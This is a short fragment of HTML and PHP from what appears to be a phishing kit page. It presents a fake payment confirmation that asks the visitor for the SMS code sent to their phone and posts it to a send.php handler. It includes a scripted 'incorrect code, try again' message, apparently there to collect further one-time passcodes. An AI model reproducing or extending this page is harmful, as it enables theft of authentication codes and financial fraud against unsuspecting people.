    ...
    <div class="main-content">
        <div class="payment-modal">
            ...
            <p class="payment-instruction" data-translate="instruction">
                Enter the SMS code that you received on your phone number to confirm your details.
            </p>
<?php
if(isset($_GET['e'])){
  echo '<span style="color: red; display: inline; font-size: 11px;">Incorrect SMS code – Please try again.
</span><br><br>';
}
?>              
            ...
            <form action="send.php" method="POST">
                <div class="sms-input-container">
                    <label class="sms-label" data-translate="sms-label">SMS Code</label>
                    <input type="tel" id="smsCode" name="keydod" class="sms-code" placeholder="* * * * * *" autocomplete="off" required/>
                </div>
